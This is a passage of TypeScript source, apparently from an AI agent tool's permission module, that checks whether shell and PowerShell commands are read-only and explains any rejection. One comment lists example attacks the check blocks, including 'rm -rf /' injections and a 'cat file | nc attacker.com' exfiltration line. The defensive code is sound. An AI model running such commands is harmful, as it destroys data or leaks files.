          } else if (next === '\\') {
            // \\\\ → // — convert double-backslash to double-forward-slash
            result += '//';
            i += 2;
          } else {
            // All other \X — pass through literally (bash-parser keeps them as-is)
            result += command[i]! + next!;
            i += 2;
          }
        } else {
          result += command[i]!;
          i++;
        }
      }
      if (i < command.length) {
        result += '"'; // closing quote
        i++;
      }
    } else {
      // Unquoted context: detect Windows-style path tokens and convert
      // A Windows path looks like X:\ at the start of a "word"
      if (
        /[A-Za-z]/.test(ch!) &&
        i + 2 < command.length &&
        command[i + 1]! === ':' &&
        command[i + 2]! === '\\'
      ) {
        // Consume the path token (up to whitespace or special shell chars)
        let pathEnd = i;
        while (pathEnd < command.length && !/[\s|&;()<>]/.test(command[pathEnd]!)) {
          pathEnd++;
        }
        const pathToken = command.slice(i, pathEnd).replace(/\\/g, '/');
        result += pathToken;
        i = pathEnd;
      } else {
        result += ch;
        i++;
      }
    }
  }

  return result;
}

/**
 * Get detailed reason why a bash command would be rejected.
 * Returns null if the command is safe, otherwise returns the specific reason.
 *
 * Uses AST-based validation for compound commands (&&, ||, ;) to allow
 * safe compound commands like `git status && git log` while still blocking
 * dangerous constructs.
 *
 * For PowerShell commands (detected by syntax or on Windows), uses the
 * PowerShell validator with native System.Management.Automation parsing.
 *
 * This is used to provide helpful error messages that explain exactly what
 * was blocked and why, helping the agent understand and avoid the issue.
 */
export function getBashRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const trimmedCommand = command.trim();

  // Step 1: Check for dangerous control characters (before parsing)
  // These could affect parsing itself, so check first
  const controlChar = hasControlCharacters(trimmedCommand);
  if (controlChar) {
    return {
      type: 'control_char',
      char: controlChar.char,
      charCode: 0, // Not used in new flow, but kept for compatibility
      explanation: controlChar.explanation,
    };
  }

  // Step 2: Determine if this is a PowerShell command
  // Use PS validator only for commands that look like PowerShell syntax.
  // On Windows, non-PowerShell commands (e.g. `git status && git log`) are
  // validated via bash-parser with Windows path normalization instead, because
  // the PS parser has different semantics for redirects, subshells, $(), etc.
  const isWindows = process.platform === 'win32';
  const isPsCommand = looksLikePowerShell(trimmedCommand);

  if (isPsCommand && isPowerShellAvailable()) {
    debug('[Mode] Using PowerShell validator for command:', trimmedCommand);
    return getPowerShellRejectionReason(trimmedCommand, config);
  }

  // Step 2b: On Windows, reject CMD-only syntax early.
  // Commands like `if not exist`, `for /f`, `set VAR=` are Windows CMD builtins
  // that neither bash-parser nor path normalization can handle.
  if (isWindows && looksLikeCmdBuiltin(trimmedCommand)) {
    return {
      type: 'parse_error',
      error: 'Windows CMD syntax (if/for/set/copy/move) is not supported in Explore mode. Use PowerShell equivalents or bash commands instead.',
    };
  }

  // Step 2c: On Windows, normalize backslash paths for bash-parser.
  // bash-parser is POSIX and treats \ as escape chars, mangling Windows paths like
  // C:\Users\... into C:Users... or failing on trailing backslash-quote (\").
  const commandForParser = isWindows
    ? normalizeWindowsPathsForBashParser(trimmedCommand)
    : trimmedCommand;

  // Step 3: Use bash AST-based validation
  // This handles compound commands, pipelines, redirects, and substitutions properly
  const astResult = validateBashCommand(commandForParser, config.readOnlyBashPatterns);

  if (astResult.allowed) {
    debug('[Mode] Command allowed via AST validation:', trimmedCommand);
    return null;
  }

  // Step 3: Convert AST rejection reason to BashRejectionReason
  if (astResult.reason) {
    const reason = astResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'pipeline':
        // Convert to the legacy format for consistent error messages
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: reason.op,
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'command_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'process_substitution':
        return {
          type: 'dangerous_substitution',
          pattern: '<() or >()',
          explanation: reason.explanation,
        };

      case 'parameter_expansion':
        return {
          type: 'dangerous_substitution',
          pattern: '${} / $VAR',
          explanation: reason.explanation,
        };

      case 'env_assignment':
        return {
          type: 'dangerous_substitution',
          pattern: 'VAR=value',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        // Find relevant patterns to help the agent understand what format is expected
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }

      case 'compound_partial_fail':
        // Return info about which commands failed in a compound expression
        return {
          type: 'compound_partial_fail',
          failedCommands: reason.failedCommands,
          passedCommands: reason.passedCommands,
        };

      case 'background_execution':
        // Background execution with & operator - convert to dangerous_operator format
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };
    }
  }

  // Fallback: shouldn't reach here, but return generic rejection if we do
  debug('[Mode] Unexpected: AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: trimmedCommand,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(trimmedCommand, config),
  };
}

/**
 * Get detailed reason why a PowerShell command would be rejected.
 * Converts PowerShell validation results to BashRejectionReason format
 * for consistent error message handling.
 */
function getPowerShellRejectionReason(command: string, config: ToolCheckConfig): BashRejectionReason | null {
  const psResult = validatePowerShellCommand(command, config.readOnlyBashPatterns);

  if (psResult.allowed) {
    debug('[Mode] PowerShell command allowed via AST validation:', command);
    return null;
  }

  // Convert PowerShell rejection reason to BashRejectionReason format
  if (psResult.reason) {
    const reason = psResult.reason;

    switch (reason.type) {
      case 'parse_error':
        return { type: 'parse_error', error: reason.error };

      case 'powershell_unavailable':
        // Fall back to bash validation if PowerShell is not available
        debug('[Mode] PowerShell unavailable, falling back to bash validation');
        return null;

      case 'pipeline':
        return {
          type: 'dangerous_operator',
          operator: '|',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'redirect':
        return {
          type: 'dangerous_operator',
          operator: '>',
          operatorType: 'redirect',
          explanation: reason.explanation,
        };

      case 'subexpression':
        return {
          type: 'dangerous_substitution',
          pattern: '$()',
          explanation: reason.explanation,
        };

      case 'script_block':
        return {
          type: 'dangerous_substitution',
          pattern: '{ }',
          explanation: reason.explanation,
        };

      case 'invoke_expression':
        return {
          type: 'dangerous_substitution',
          pattern: 'Invoke-Expression',
          explanation: reason.explanation,
        };

      case 'dot_sourcing':
        return {
          type: 'dangerous_substitution',
          pattern: '. (dot-sourcing)',
          explanation: reason.explanation,
        };

      case 'assignment':
        return {
          type: 'dangerous_operator',
          operator: '=',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'background_execution':
        return {
          type: 'dangerous_operator',
          operator: '&',
          operatorType: 'chain',
          explanation: reason.explanation,
        };

      case 'unsafe_command': {
        const relevantPatterns = findRelevantPatterns(reason.command, config.readOnlyBashPatterns);
        const mismatchAnalysis = analyzePatternMismatch(reason.command, config.readOnlyBashPatterns);
        const commandHint = findBlockedCommandHint(reason.command, config);

        return {
          type: 'no_safe_pattern',
          command: reason.command,
          relevantPatterns,
          mismatchAnalysis: mismatchAnalysis ?? undefined,
          commandHint,
        };
      }
    }
  }

  // Fallback
  debug('[Mode] Unexpected: PowerShell AST rejected but no reason provided');
  return {
    type: 'no_safe_pattern',
    command: command,
    relevantPatterns: [],
    mismatchAnalysis: undefined,
    commandHint: findBlockedCommandHint(command, config),
  };
}

/**
 * Format actionable guidance for permission customization.
 * Tells the agent where to read/modify permissions.
 */
function formatPermissionGuidance(config: ToolCheckConfig): string {
  const lines: string[] = [];

  // Only include guidance if permission paths are available
  if (config.permissionPaths) {
    lines.push('');
    lines.push('To see what commands are allowed in Explore mode, read:');
    lines.push(`  • ${config.permissionPaths.workspacePath}`);
    lines.push(`  • ${config.permissionPaths.appDefaultPath}`);
    lines.push('');
    lines.push('To understand the permission system and how to customize:');
    lines.push(`  • ${config.permissionPaths.docsPath}`);
  }

  return lines.join('\n');
}

/**
 * Detect known upstream bash-parser tokenizer bugs.
 *
 * bash-parser has longstanding edge cases around quoted `$` / `)` handling
 * that can throw internal errors like `reducers.doubleQuoting`.
 */
function isKnownBashParserTokenizerBug(error: string): boolean {
  const lower = error.toLowerCase();
  return lower.includes('doublequoting') || lower.includes('reducers.doublequoting');
}

/**
 * Format a bash rejection reason into a user-friendly error message.
 * The message explains what was blocked and why, helping the agent understand the issue.
 * Includes actionable guidance on how to customize permissions.
 */
export function formatBashRejectionMessage(reason: BashRejectionReason, config: ToolCheckConfig): string {
  const modeSwitchHint = `Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`;
  const permissionGuidance = formatPermissionGuidance(config);

  switch (reason.type) {
    case 'control_char':
      return `Bash command blocked: contains "${reason.char}" character. ${reason.explanation}. ${modeSwitchHint}`;

    case 'no_safe_pattern': {
      // Build a helpful message showing what patterns might be relevant
      const lines: string[] = [];
      lines.push(`Bash command \`${reason.command}\` is not in the read-only allowlist.`);

      // Prefer deterministic per-command guidance over fuzzy regex diagnostics.
      if (reason.commandHint) {
        lines.push('');
        lines.push(`Why: ${reason.commandHint.reason}`);
        if (reason.commandHint.context) {
          lines.push(`Context: ${reason.commandHint.context}`);
        }
        if (reason.commandHint.tryInstead && reason.commandHint.tryInstead.length > 0) {
          lines.push('Try instead:');
          for (const item of reason.commandHint.tryInstead) {
            lines.push(`  • ${item}`);
          }
        }
        if (reason.commandHint.example) {
          lines.push(`Example: \`${reason.commandHint.example}\``);
        }
      }

      // If we have mismatch analysis, show detailed diagnostics as heuristic guidance.
      if (reason.mismatchAnalysis) {
        const analysis = reason.mismatchAnalysis;
        lines.push('');

        // Show what matched and where it failed
        if (analysis.matchedPrefix) {
          lines.push(`Matched: \`${analysis.matchedPrefix}\` (${analysis.failedAtPosition} chars)`);
        }
        if (analysis.failedToken) {
          lines.push(`Failed at: \`${analysis.failedToken}\` (position ${analysis.failedAtPosition})`);
        }

        // Show the actionable suggestion if we have one
        if (analysis.suggestion) {
          lines.push('');
          lines.push(analysis.suggestion);
        }

        // Show which pattern was closest to matching (heuristic only)
        if (analysis.bestMatchPattern?.comment) {
          lines.push('');
          lines.push(`Closest allowlist hint (heuristic): ${analysis.bestMatchPattern.comment}`);
        }
      } else if (reason.relevantPatterns.length > 0) {
        // Fall back to showing relevant patterns if no mismatch analysis
        lines.push('');
        lines.push('Heuristic relevant pattern(s):');
        for (const pattern of reason.relevantPatterns) {
          // Show the pattern regex (simplified for readability)
          const patternDisplay = pattern.source.length > 80
            ? pattern.source.substring(0, 77) + '...'
            : pattern.source;
          lines.push(`  Pattern: \`${patternDisplay}\``);
          if (pattern.comment) {
            lines.push(`  → ${pattern.comment}`);
          }
        }
        lines.push('');
        lines.push('The command must match an allowlist pattern exactly from the start.');
      }

      // Add permission guidance for pattern-based rejections
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'dangerous_operator':
      return `Bash command blocked: contains "${reason.operator}" operator. This ${reason.explanation}. Run commands separately or switch to Ask mode.`;

    case 'dangerous_substitution':
      return `Bash command blocked: contains ${reason.pattern} syntax. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parse_error': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: could not parse command safely (${reason.error}).`);

      if (isKnownBashParserTokenizerBug(reason.error)) {
        lines.push('');
        lines.push('This looks like a known bash-parser tokenizer bug (not necessarily unsafe intent).');
        lines.push('Try using single quotes for regex/text arguments instead of double quotes.');
        lines.push('Problematic patterns often involve `$` (and sometimes `)`) inside double-quoted strings.');
        lines.push('Example: `rg -n "a|b|$|c" ...` → `rg -n \'a|b|$|c\' ...`');
      }

      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    case 'compound_partial_fail': {
      // Some commands in a compound expression failed
      const lines: string[] = [];
      lines.push('Bash command blocked: compound command contains unsafe operations.');
      lines.push('');
      if (reason.passedCommands.length > 0) {
        lines.push('✓ Allowed commands:');
        for (const cmd of reason.passedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      if (reason.failedCommands.length > 0) {
        lines.push('✗ Blocked commands (not in read-only allowlist):');
        for (const cmd of reason.failedCommands) {
          lines.push(`  • \`${cmd}\``);
        }
      }
      // Add permission guidance for compound command failures
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }

    // New AST-based types (shouldn't reach here as they're converted above, but handle for completeness)
    case 'pipeline':
      return `Bash command blocked: contains pipeline (|). ${reason.explanation}. ${modeSwitchHint}`;

    case 'redirect':
      return `Bash command blocked: contains "${reason.op}" redirect. This ${reason.explanation}. ${modeSwitchHint}`;

    case 'command_expansion':
      return `Bash command blocked: contains command substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'process_substitution':
      return `Bash command blocked: contains process substitution. ${reason.explanation}. ${modeSwitchHint}`;

    case 'parameter_expansion':
      return `Bash command blocked: contains variable expansion (\${} / $VAR). ${reason.explanation}. ${modeSwitchHint}`;

    case 'env_assignment':
      return `Bash command blocked: contains environment variable assignment. ${reason.explanation}. ${modeSwitchHint}`;

    case 'unsafe_command': {
      const lines: string[] = [];
      lines.push(`Bash command blocked: \`${reason.command}\` is not in the read-only allowlist.`);
      lines.push(permissionGuidance);
      lines.push('');
      lines.push(modeSwitchHint);
      return lines.join('\n');
    }
  }
}

/**
 * Check if a Bash command is read-only using the given config.
 *
 * Uses AST-based validation to properly handle compound commands like
 * `git status && git log` - each part is validated separately, and the
 * command is allowed only if ALL parts pass.
 *
 * A command is considered safe if:
 * 1. It does NOT contain dangerous control characters (newlines, etc.)
 * 2. All simple commands match read-only patterns (including in compound commands)
 * 3. It does NOT contain redirects (>, >>, <) - these modify files
 * 4. It does NOT contain command/process substitution ($(), ``, <(), >())
 * 5. It does NOT run in background (&)
 *
 * Compound commands (&&, ||, |) are allowed when ALL parts are safe:
 * - `git status && git log` is allowed (both commands are safe)
 * - `git log | head` is allowed (both commands are safe)
 *
 * This multi-step check prevents attacks like:
 * - `ls\nrm -rf /` (newline injection)
 * - `git status && rm -rf /` (dangerous command in chain - rm not in allowlist)
 * - `cat file | nc attacker.com` (nc not in allowlist)
 * - `ls $(rm -rf /)` (command substitution)
 */
/**
 * Check if a Bash command is read-only using a custom config.
 * Exported for testing purposes.
 *
 * @param command - The bash command to check
 * @param config - Tool check configuration with patterns
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommandWithConfig(command: string, config: ToolCheckConfig): boolean {
  // Use getBashRejectionReason which now uses AST-based validation
  // If no rejection reason, command is safe
  const rejection = getBashRejectionReason(command, config);
  return rejection === null;
}

/**
 * Check if a Bash command is read-only using the default safe mode config.
 * Exported for testing.
 *
 * @param command - The bash command to check
 * @returns true if command is safe to run in read-only mode
 */
export function isReadOnlyBashCommand(command: string): boolean {
  return isReadOnlyBashCommandWithConfig(command, SAFE_MODE_CONFIG);
}

/**
 * Extract the write target path from a bash command.
 * Returns the file path if the command writes to a file via redirect, null otherwise.
 *
 * Handles:
 * - Direct redirects: `echo "x" > /path/file`
 * - Codex subshell pattern: `/bin/zsh -lc "cat <<'EOF' > /path/file\n...\nEOF"`
 * - sh/bash -c variants: `bash -c "echo x > /path/file"`
 * - PowerShell Out-File: `@(...) | Out-File -FilePath 'path'`
 * - PowerShell Set-Content/Add-Content: `'...' | Set-Content -Path 'path'`
 */
export function extractBashWriteTarget(command: string): string | null {
  // Pattern 1: Quoted path after redirect (handles Codex's escaped quotes)
  // Matches: > "/path/to/file" or > \"/path/to/file\"
  const quotedPathMatch = command.match(/>\s*\\?"([^"]+)"/);
  if (quotedPathMatch?.[1] && quotedPathMatch[1] !== '/dev/null') {
    return quotedPathMatch[1];
  }

  // Pattern 2: shell -c/-lc with inner redirect (Codex pattern, unquoted paths)
  // Match: /bin/zsh -lc "... > /path/to/file ..." or bash -c '... > /path ...'
  const shellExecMatch = command.match(
    /(?:\/bin\/)?(?:zsh|bash|sh)\s+(?:-\w+\s+)*["'].*?>\s*([^\s'"\\]+)/
  );
  if (shellExecMatch?.[1] && shellExecMatch[1] !== '/dev/null') {
    return shellExecMatch[1];
  }

  // Pattern 3: Direct redirect - extract path after > or >>
  // Guard against non-shell uses like JavaScript arrow functions (=>).
  const directRedirectMatch = command.match(/(?:^|[^=<>])>{1,2}\s*([^\s;|&"'>=][^\s;|&"'>]*)/);
  if (directRedirectMatch?.[1] && directRedirectMatch[1] !== '/dev/null') {
    return directRedirectMatch[1];
  }

  // Pattern 4: PowerShell Out-File with -FilePath or -Path parameter
  // Matches: | Out-File -FilePath 'path' or | Out-File -Path "path"
  const outFileParamMatch = command.match(/Out-File\s+-(?:File)?Path\s+['"]([^'"]+)['"]/i);
  if (outFileParamMatch?.[1]) {
    return outFileParamMatch[1];
  }

  // Pattern 5: PowerShell Out-File with positional path (no -FilePath flag)
  // Matches: | Out-File 'path' or | Out-File "path"
  // Must not match -FilePath or -Encoding etc.
  const outFilePosMatch = command.match(/Out-File\s+['"]([^'"]+)['"]/i);
  if (outFilePosMatch?.[1] && !command.match(/Out-File\s+-\w/i)) {
    return outFilePosMatch[1];
  }

  // Pattern 6: PowerShell Set-Content or Add-Content with -Path parameter
  // Matches: | Set-Content -Path 'path' or | Add-Content -Path "path"
  const setContentMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+['"]([^'"]+)['"]/i);
  if (setContentMatch?.[1]) {
    return setContentMatch[1];
  }

  // Pattern 7: PowerShell Set-Content/Add-Content with escaped quotes (inside powershell.exe -Command "...")
  // When Codex wraps PS commands: powershell.exe -Command "Set-Content -Path \"C:\path\file\" -Value ..."
  // The -Path value uses escaped quotes \" which don't match Pattern 6's ['"] anchors.
  // This is a REQUIRED fallback: in the Codex agent context, PowerShell AST parsing
  // may be unavailable (isPowerShellAvailable() returns false), so extractPowerShellWriteTarget()
  // returns null and this regex is the only path extraction mechanism.
  const setContentEscapedMatch = command.match(/(?:Set|Add)-Content\s+-Path\s+\\"([^"]+)\\"/i);
  if (setContentEscapedMatch?.[1]) {
    return setContentEscapedMatch[1];
  }

  // Pattern 8: PowerShell Out-File with escaped quotes (same wrapper scenario)
  const outFileEscapedMatch = command.match(/Out-File\s+-(?:File)?Path\s+\\"([^"]+)\\"/i);
  if (outFileEscapedMatch?.[1]) {
    return outFileEscapedMatch[1];
  }

  return null;
}

/**
 * Check if a command looks like it might be trying to write files.
 * Used to provide better error messages when write detection fails.
 */
export function looksLikePotentialWrite(command: string): boolean {
  // Shell redirects at token boundaries (avoid matching JS arrows like =>)
  const hasRedirectToken = /(?:^|[\s;|&()])\d*>>?(?![=>])/.test(command);
  // Common PowerShell write cmdlets
  const hasPowerShellWriteCmdlet = /(?:Out-File|Set-Content|Add-Content)\b/i.test(command);
  return hasRedirectToken || hasPowerShellWriteCmdlet;
}

/**
 * Get a helpful hint based on comparing target path to plans folder path.
 * Detects common mistakes and provides actionable guidance.
 */
export function getPathHint(targetPath: string, plansFolderPath: string, dataFolderPath?: string): string | null {
  const normalizedTarget = targetPath.replace(/\\/g, '/').toLowerCase();
  const normalizedPlans = plansFolderPath.replace(/\\/g, '/').toLowerCase();

  // Case: Writing to session folder but missing /plans/ or /data/
  if (normalizedTarget.includes('/sessions/') && !normalizedTarget.includes('/plans/') && !normalizedTarget.includes('/data/')) {
    return 'Hint: Write to the /plans/ or /data/ subfolder, not the session folder directly.';
  }

  // Case: Wrong session ID (use lowercase for comparison)
  const targetSessionMatch = normalizedTarget.match(/sessions\/([^/]+)/);
  const plansSessionMatch = normalizedPlans.match(/sessions\/([^/]+)/);
  if (targetSessionMatch && plansSessionMatch && targetSessionMatch[1] !== plansSessionMatch[1]) {
    // Get the original casing from plansFolderPath for display
    const originalSessionMatch = plansFolderPath.replace(/\\/g, '/').match(/sessions\/([^/]+)/);
    return `Hint: Wrong session ID. Current session is "${originalSessionMatch?.[1] ?? plansSessionMatch[1]}".`;
  }

  // Case: Writing to workspace root instead of session
  if (normalizedTarget.includes('/.craft-agent/workspaces/') && !normalizedTarget.includes('/sessions/')) {
    return 'Hint: Write to the session plans or data folder, not the workspace root.';
  }

  // Case: Writing outside .craft-agent entirely
  if (!normalizedTarget.includes('/.craft-agent/')) {
    return 'Hint: Files must be written to the session plans or data folder. Use plansFolderPath or dataFolderPath from <session_state>.';
  }

  return null;
}

/**
 * Check if an MCP tool is read-only using the given config
 */
function isReadOnlyMcpToolWithConfig(toolName: string, config: ToolCheckConfig): boolean {
  return config.readOnlyMcpPatterns.some(pattern => pattern.test(toolName));
}

/**
 * Check if an API call is allowed using the given config
 * Checks fine-grained endpoint rules (method + path pattern)
 */
function isApiCallAllowedWithConfig(method: string, path: string | undefined, config: ToolCheckConfig): boolean {
  const upperMethod = method.toUpperCase();

  // GET is always allowed
  if (upperMethod === 'GET') return true;

  // Check fine-grained endpoint rules (if path is available)
  if (path && config.allowedApiEndpoints) {
    for (const rule of config.allowedApiEndpoints) {
      if (rule.method === upperMethod && rule.pathPattern.test(path)) {
        return true;
      }
    }
  }

  return false;
}

/**
 * Check if an API endpoint is allowed based on permissions context.
 * Used in 'ask' mode to auto-allow whitelisted API endpoints from permissions.json.
 *
 * @param method - HTTP method (GET, POST, etc.)
 * @param path - API endpoint path
 * @param permissionsContext - Context for loading custom permissions
 * @returns true if endpoint is allowed (GET or matches allowedApiEndpoints rules)
 */
export function isApiEndpointAllowed(
  method: string,
  path: string | undefined,
  permissionsContext?: PermissionsContext
): boolean {
  let config: ToolCheckConfig;

  if (permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  return isApiCallAllowedWithConfig(method, path, config);
}

/**
 * Tools that are always allowed in any mode (read-only by nature)
 */
const ALWAYS_ALLOWED_TOOLS = new Set([
  'Read', 'Glob', 'Grep',           // File reading
  'Task', 'TaskOutput',             // Agent orchestration
  'WebFetch', 'WebSearch',          // Web research
  'TodoWrite',                      // Task tracking
  'SubmitPlan',                     // Plan submission
  'LSP',                            // Language server (read-only)
  // Browser automation tool (canonical wrapper)
  'browser_tool',
]);

/**
 * Result type for tool permission checks
 */
export type ToolCheckResult =
  | { allowed: true; requiresPermission?: false }
  | { allowed: true; requiresPermission: true; description: string }
  | { allowed: false; reason: string };

/**
 * Centralized check: should a tool be allowed based on permission mode?
 *
 * This is the single source of truth for tool permissions.
 * Returns different results based on the permission mode:
 * - 'safe': Block writes entirely (no prompting)
 * - 'ask': Allow but may require permission for dangerous operations
 * - 'allow-all': Allow everything
 */
export function shouldAllowToolInMode(
  toolName: string,
  toolInput: unknown,
  mode: PermissionMode,
  options?: {
    plansFolderPath?: string;
    dataFolderPath?: string;
    permissionsContext?: PermissionsContext;
  }
): ToolCheckResult {
  // Get config: merged custom if context provided, otherwise defaults
  let config: ToolCheckConfig;

  if (options?.permissionsContext) {
    // Lazy import to avoid circular dependency
    const { permissionsConfigCache } = require('./permissions-config.ts');
    config = permissionsConfigCache.getMergedConfig(options.permissionsContext);
  } else {
    config = SAFE_MODE_CONFIG;
  }

  // In 'allow-all' mode, all tools are allowed (no restrictions)
  if (mode === 'allow-all') {
    return { allowed: true };
  }

  // In 'ask' mode, all tools are allowed (user will be prompted for confirmation)
  if (mode === 'ask') {
    return { allowed: true };
  }

  // Safe mode: check against read-only allowlist

  // Always-allowed tools (read-only by nature)
  if (ALWAYS_ALLOWED_TOOLS.has(toolName)) {
    return { allowed: true };
  }

  // Check if tool name ends with an always-allowed tool (for MCP variants like mcp__plan__SubmitPlan)
  for (const allowedTool of ALWAYS_ALLOWED_TOOLS) {
    if (toolName.endsWith(`__${allowedTool}`)) {
      return { allowed: true };
    }
  }

  // Browser tool aliases (legacy browser_open/browser_snapshot/...)
  // are normalized centrally to avoid drift across permission checks.
  if (isBrowserToolNameOrAlias(toolName)) {
    return { allowed: true };
  }

  // Handle Bash - check if command is read-only
  // Uses detailed rejection reasons to provide helpful error messages
  if (toolName === 'Bash') {
    const input = toolInput as Record<string, unknown> | null;
    const command = input?.command;
    if (typeof command === 'string') {
      const rejection = getBashRejectionReason(command, config);
      if (!rejection) {
        // Command is safe - no rejection reason means it passed all checks
        return { allowed: true };
      }

      // Plans/data folder exception for bash/PowerShell writes.
      // Bash uses redirects: /bin/zsh -lc "cat <<'EOF' > /path/to/plans/file.md..."
      // PowerShell uses: @(...) | Out-File -FilePath 'C:\path\to\plans\file.md'
      // Only run this branch for likely write attempts to avoid false positives.
      const likelyWriteAttempt =
        (rejection.type === 'dangerous_operator' && rejection.operatorType === 'redirect') ||
        looksLikePotentialWrite(command);

      if (likelyWriteAttempt && (options?.plansFolderPath || options?.dataFolderPath)) {
        const targetPath = extractBashWriteTarget(command) ?? extractPowerShellWriteTarget(command);
        if (targetPath) {
          // Check plans folder with robust path containment (prevents sibling-prefix bypasses)
          if (options?.plansFolderPath && isPathWithinDirectory(targetPath, options.plansFolderPath)) {
            debug(`[Mode] Allowing write to plans folder: ${targetPath}`);
            return { allowed: true };
          }

          // Check data folder with robust path containment
          if (options?.dataFolderPath && isPathWithinDirectory(targetPath, options.dataFolderPath)) {
            debug(`[Mode] Allowing write to data folder: ${targetPath}`);
            return { allowed: true };
          }

          // Target path extracted but not in any allowed folder - give specific error with helpful hint
          debug(`[Mode] Write target "${targetPath}" is not in plans or data folder`);
          const pathHint = options?.plansFolderPath ? getPathHint(targetPath, options.plansFolderPath, options?.dataFolderPath) : null;
          const lines = [
            `Write blocked (Explore mode) - target not in allowed folders:`,
            ``,
            `  Target: ${targetPath}`,
          ];
          if (options?.plansFolderPath) {
            lines.push(`  Plans:  ${options.plansFolderPath}`);
          }
          if (options?.dataFolderPath) {
            lines.push(`  Data:   ${options.dataFolderPath}`);
          }
          if (pathHint) {
            lines.push(``, pathHint);
          }
          const plansHint = options?.plansFolderPath ? `For plans, write to: ${options.plansFolderPath}` : null;
          const dataHint = options?.dataFolderPath ? `For data output, write to: ${options.dataFolderPath}` : null;
          lines.push(
            ``,
            `Allowed paths in Explore mode:`,
            ...[plansHint, dataHint].filter(Boolean).map(p => `• ${p}`),
            `• Or ask the user to switch to Ask or Auto mode (${config.shortcutHint}) to enable writes anywhere`
          );
          return {
            allowed: false,
            reason: lines.join('\n'),
          };
        }
      }

      // Return detailed error message explaining exactly why the command was blocked
      return {
        allowed: false,
        reason: formatBashRejectionMessage(rejection, config),
      };
    }
    // No command provided - block with generic message
    return {
      allowed: false,
      reason: `Bash command is missing or invalid. Switch to Ask or Allow All mode (${config.shortcutHint}) to run it.`,
    };
  }

  // Handle Write/Edit/MultiEdit/NotebookEdit - allow if targeting plans folder or allowedWritePaths
  if (toolName === 'Write' || toolName === 'Edit' || toolName === 'MultiEdit' || toolName === 'NotebookEdit') {
    const input = toolInput as Record<string, unknown> | null;
    const filePath = (input?.file_path ?? input?.notebook_path) as string | undefined;

    if (filePath) {
      // Check plans folder exception
      if (options?.plansFolderPath) {
        debug(`[Mode] Checking plans folder exception: path="${filePath}", plansDir="${options.plansFolderPath}"`);
        if (isPathWithinDirectory(filePath, options.plansFolderPath)) {
          debug(`[Mode] Allowing ${toolName} to plans folder`);
          return { allowed: true };
        }
      }

      // Check data folder exception
      if (options?.dataFolderPath && isPathWithinDirectory(filePath, options.dataFolderPath)) {
        debug(`[Mode] Allowing ${toolName} to data folder`);
        return { allowed: true };
      }

      // Check allowedWritePaths from permissions config
      if (config.allowedWritePaths && config.allowedWritePaths.length > 0) {
        if (matchesAllowedWritePath(filePath, config.allowedWritePaths)) {
          debug(`[Mode] Allowing ${toolName} via allowedWritePaths`);
          return { allowed: true };
        }
      }

      // Not in plans/data folder and not in allowedWritePaths - provide detailed rejection
      if (options?.plansFolderPath || options?.dataFolderPath) {
        debug(`[Mode] ${toolName} target "${filePath}" not in allowed folders or allowedWritePaths`);
        const pathHint = options?.plansFolderPath ? getPathHint(filePath, options.plansFolderPath, options?.dataFolderPath) : null;
        const lines = [
          `${toolName} blocked (Explore mode) - target not in allowed folders:`,
          ``,
          `  Target: ${filePath}`,
        ];
        if (options?.plansFolderPath) {
          lines.push(`  Plans:  ${options.plansFolderPath}`);
        }
        if (options?.dataFolderPath) {
          lines.push(`  Data:   ${options.dataFolderPath}`);
        }
        if (pathHint) {
          lines.push(``, pathHint);
        }
        const plansHint = options?.plansFolderPath ? `For plans, write to: ${options.plansFolderPath}` : null;
        const dataHint = options?.dataFolderPath ? `For data output, write to: ${options.dataFolderPath}` : null;
        lines.push(
          ``,
          `Allowed paths in Explore mode:`,
          ...[plansHint, dataHint].filter(Boolean).map(p => `• ${p}`),
          `• Or ask the user to switch to Ask or Auto mode (${config.shortcutHint}) to enable writes anywhere`
        );
        return {
          allowed: false,
          reason: lines.join('\n'),
        };
      }
    }
  }

  // Blocked tools (Write, Edit, MultiEdit, NotebookEdit)
  if (config.blockedTools.has(toolName)) {
    return {
      allowed: false,
      reason: getBlockReasonWithConfig(toolName, config)
    };
  }

  // Handle MCP tools - allow read-only, block write operations
  if (toolName.startsWith('mcp__')) {
    // Always allow documentation tools (read-only, always available)
    if (toolName.startsWith('mcp__craft-agents-docs__')) {
      return { allowed: true };
    }

    // Handle session-scoped tools - derive safe-mode behavior from canonical session-tools-core metadata
    if (toolName.startsWith('mcp__session__')) {
      const safeAllowedSessionTools = getSessionSafeAllowedToolNames({
        prefix: 'mcp__session__',
        includeDeveloperFeedback: FEATURE_FLAGS.developerFeedback,
      });

